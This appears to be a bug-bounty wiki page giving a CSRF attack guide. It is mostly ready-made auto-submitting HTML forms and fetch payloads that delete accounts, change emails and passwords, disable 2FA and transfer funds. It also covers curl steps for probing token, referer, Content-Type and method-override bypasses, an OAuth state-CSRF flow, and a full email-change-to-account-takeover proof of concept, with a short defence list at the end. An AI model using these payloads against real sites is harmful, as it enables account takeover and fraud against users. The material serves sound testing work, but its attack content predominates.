---
type: wiki
category: attack
tool: burp,manual
status: active
last-updated: 2026-04-21
---

# CSRF Complete Guide (2026 Edition)

> **Purpose:** Since SameSite Lax became Chrome's default, many people assume CSRF is dead. In fact there are still 3 live avenues:
> (1) sites with SameSite=None / legacy cookies inside an iframe / (2) Lax does not block top-level GET / (3) Lax has a 2-second window for POST
> Combined with JSON CSRF, referrer bypass, tokens not bound to the user, and other implementation flaws, CSRF is still a common P2-P3 payout.

## 0. Principle

The browser automatically attaches cookies to requests to the same origin/subdomain. The attacker crafts a form or fetch that makes the victim perform an attacker-specified action "using their own session" (change password, transfer funds, delete data).

```html
<!-- Attacker page evil.com -->
<form action="https://target.com/account/delete" method="POST" id="x">
  <input name="confirm" value="yes">
</form>
<script>document.getElementById('x').submit()</script>

<!-- Victim opens evil.com -> auto POST -> cookie attached -> account deleted -->
```

## 1. 2026 SameSite Landscape

### 1.1 Chrome / Firefox / Edge default

```
Set-Cookie: session=xxx                       <- no SameSite -> treated as Lax
Set-Cookie: session=xxx; SameSite=Strict      <- never sent cross-site
Set-Cookie: session=xxx; SameSite=Lax         <- only sent on top-level GET cross-site
Set-Cookie: session=xxx; SameSite=None; Secure <- never blocked (requires HTTPS)
```

### 1.2 SameSite Lax exceptions (important attack surface)

#### Exception A: Top-level navigation (GET)

```html
<!-- Top-level redirect from evil.com to target -->
<meta http-equiv="refresh" content="0;url=https://target.com/api/delete?id=123">
```

If target uses GET to handle state-changing operations (bad design) -> CSRF succeeds.

#### Exception B: 2-second window for POST (Chrome 80+ special rule)

For a "new cookie (< 2 seconds old)", cross-site POST is still sent. If the user just logged in and jumps to evil.com within 2 seconds -> CSRF is possible.

In practice this is hard to trigger but it **exists** — cite it in reports as defense-in-depth.

#### Exception C: SameSite=None + iframe

```html
<iframe src="https://target.com/account/delete?id=123"></iframe>
<!-- If cookie SameSite=None -> iframe's GET carries the cookie -->
```

### 1.3 Quick check of target cookies

```bash
curl -sk -I https://target.com/login -c /dev/stdout | grep -i samesite
# or after logging in, check DevTools -> Application -> Cookies -> SameSite column
```

## 2. Typical CSRF PoC

### 2.1 Form-based GET

```html
<img src="https://target.com/transfer?to=attacker&amt=1000" style="display:none">
```

### 2.2 Form-based POST

```html
<form action="https://target.com/account/email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit">
</form>
<script>document.forms[0].submit()</script>
```

### 2.3 Fetch (only has cookies when CORS allows it)

```javascript
fetch('https://target.com/api/delete', {
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'id=1'
});
// If target has Access-Control-Allow-Credentials + ACAO is not wildcard -> CSRF
```

## 3. Token bypass techniques

### 3.1 Token not validated (most common)

```bash
# Normal request
curl -X POST /api/delete -d 'id=1&csrf_token=abc'
-> 200

# Remove token
curl -X POST /api/delete -d 'id=1'
-> 200 or still succeeds -> token not validated
```

### 3.2 Empty-string token passes

```bash
curl -X POST /api/delete -d 'id=1&csrf_token='
```

### 3.3 Token not bound to user

```bash
# Get a token using the attacker's own session
# Stuff it into the victim's form

TOKEN=$(curl -sc - /login | grep XSRF | awk '{print $7}')
# Put it into the victim's fetch -> some apps only check "token exists and has the right format" without verifying ownership
```

### 3.4 Token is predictable / static

```
# Fetch the token several times in a row
for i in {1..5}; do curl -s /api/token ; done
# If it's the same each time or increments sequentially -> attacker can predict it
```

### 3.5 Method override bypass

```bash
# Change to GET to bypass CSRF check (some apps only check POST)
curl "https://target.com/api/delete?id=1&_method=DELETE"

# Or via X-HTTP-Method-Override
curl -X POST "https://target.com/api/data" \
  -H "X-HTTP-Method-Override: DELETE" \
  -d 'id=1'
```

### 3.6 Referer check bypass

```
# App only checks "Referer contains target.com"
Referer: https://evil.com/target.com/
Referer: https://target.com.evil.com/
Referer: https://evil.com/?target.com

# App checks exact match -> use https->http downgrade / data URL / strip it
# Some apps allow the request through when Referer is absent (strip it via meta refresh)
<meta name="referrer" content="no-referrer">
```

### 3.7 Content-Type bypass (JSON CSRF)

Many apps only accept `application/json`, assuming form-based attacks can't reach them. But:

**Method A: stuff JSON into text/plain**

```html
<form enctype="text/plain" action="https://target.com/api/delete" method="POST">
  <input name='{"id":1,"_pad":"' value='pad"}'>
</form>
<script>document.forms[0].submit()</script>
```

The browser sends `Content-Type: text/plain`, body = `{"id":1,"_pad":"=pad"}`. If the server does lazy parsing (treats it as JSON as soon as it sees `{`) -> this works.

**Method B: fetch + simple CORS**

```javascript
fetch('https://target.com/api/delete', {
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'text/plain'},  // simple, no preflight
  body:'{"id":1}'
});
```

`text/plain`, `multipart/form-data`, and `application/x-www-form-urlencoded` are simple Content-Types that don't trigger a preflight. If the server reads JSON (Express `express.json()` checks Content-Type and won't parse it, but if `express.text()` or a raw body parser is used -> it works) -> bypass achieved.

**Method C: Flash / SWF relay** (old, not supported by Chrome)

### 3.8 Double-submit cookie bypass

Some apps store the CSRF token in a cookie plus the request body and compare them. If an attacker can **set a cookie on the target domain** (via subdomain XSS / cookie tossing) -> they can set their own token -> bypass.

## 4. 2FA / Password reset CSRF (high-payout ATO)

### 4.1 2FA disable via CSRF

```
POST /api/2fa/disable
-> If there's no token or the token can be bypassed -> attacker disables the victim's 2FA -> enters ATO chain
```

### 4.2 Password reset via CSRF

```html
<form action="https://target.com/account/password" method="POST">
  <input name="new_password" value="attacker_pass">
  <input name="confirm" value="attacker_pass">
</form>
```

If the old password isn't required and a token is missing -> ATO

### 4.3 Email change CSRF (post-reset)

```
POST /account/email
email=attacker@evil.com

-> Email changed -> attacker clicks the reset link sent to evil.com -> ATO
```

## 5. OAuth CSRF

### 5.1 OAuth callback without state check

```
Attacker flow:
1. Obtain a code via the attacker's own OAuth flow
2. Place the code in the victim's browser:
   https://target.com/oauth/callback?code=ATTACKER_CODE
3. Victim clicks -> target links ATTACKER_GOOGLE_ACCOUNT to the victim's target account
4. Attacker logs in with their own Google account -> lands in the victim's target account
```

See [16-oauth-attack-chains.md](16-oauth-attack-chains.md) §4 for details.

## 6. Referrer-free techniques (new)

```html
<!-- Cross-Origin Opener Policy bypass -->
<a href="https://target.com/api/delete?id=1" rel="noreferrer noopener">click</a>

<!-- data: URL -->
<meta http-equiv="refresh" content="0;url=data:text/html,<form...">
```

## 7. Tools

### 7.1 Burp CSRF PoC generator

```
Burp Pro -> Right-click request -> Engagement tools -> Generate CSRF PoC
-> Automatically generates an HTML form + submit script
```

### 7.2 xsrfprobe

```bash
pip3 install xsrfprobe
xsrfprobe -u https://target.com/ --crawl
# Auto crawl + detect token mechanism + fuzz bypasses
```

### 7.3 Nuclei CSRF templates

```bash
nuclei -u https://target.com -tags csrf
# Detects misconfigured cookie SameSite, missing tokens, unvalidated tokens
```

## 8. Full PoC walkthrough: Email change via CSRF

### Step 1: Confirm the target endpoint
```
POST /api/account/email
Content-Type: application/json
Cookie: session=...

{"email":"new@x.com"}
```

### Step 2: Check defenses
```bash
# SameSite
curl -I -c /dev/stdout https://target.com/login | grep -i samesite
# If SameSite=None or absent -> attackable

# Token validation
curl -X POST /api/account/email \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=...' \
  -d '{"email":"a@b.c"}'
# No token -> if 200 succeeds -> vulnerable

# Content-Type restriction
curl -X POST /api/account/email \
  -H 'Content-Type: text/plain' \
  -H 'Cookie: session=...' \
  -d '{"email":"a@b.c"}'
# If 200 -> JSON CSRF is feasible
```

### Step 3: Build the PoC
```html
<!-- evil.com/poc.html -->
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://target.com/api/account/email"
      method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","_":"' value='"}'>
</form>
<script>document.getElementById('csrf').submit()</script>
</body>
</html>
```

### Step 4: Test
1. Victim logs into target.com
2. Victim opens evil.com/poc.html
3. Victim's email is changed to attacker@evil.com
4. Attacker sends a password reset to attacker@evil.com -> ATO

## 9. Report template

```markdown
## Vulnerability Summary
https://target.com/api/account/email does not validate a CSRF token for the user's
email change, and it accepts `Content-Type: text/plain`, allowing the JSON body to be
sent via a form-based CSRF (no preflight triggered), combined with a session cookie set
to `SameSite=None` -> full CSRF -> passive ATO chain.

## Reproduction Steps

### Step 1: Confirm the email change API
[curl succeeds with no token]

### Step 2: JSON CSRF PoC
[HTML]

### Step 3: Attack chain
Victim login -> opens evil.com -> email changed -> password reset -> ATO

## Impact
- Any logged-in victim can have their email changed via CSRF
- Chained with password reset -> Full Account Takeover
- No user interaction beyond a single click (1-click)

## Severity
P2 / High (P1 if targeting an admin/high-privilege user)
```

## 10. Defensive angle (for remediation recommendations)

```
1. Validate a CSRF token on every state-changing endpoint (Synchronizer / Double-submit)
2. Tokens must be bound to user + session + have an expiry
3. Compare tokens using a timing-safe comparison
4. Cookie SameSite=Strict (or Lax if not paired with legacy OAuth)
5. Add an extra layer for sensitive operations (2FA disable, email change, password change):
   - Recent re-authentication (password entered within the last 5 minutes)
   - Email confirmation link
   - 2FA step-up
6. Strict Content-Type: if only JSON is accepted, require application/json + a token + Origin/Referer check
```

## Related Documents

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) § 4 OAuth state CSRF
- [64-cache-poisoning.md](64-cache-poisoning.md) — some CSRF combined with cache poisoning can work without a victim
- PortSwigger CSRF: https://portswigger.net/web-security/csrf
- OWASP CSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- xsrfprobe: https://github.com/0xInfection/XSRFProbe
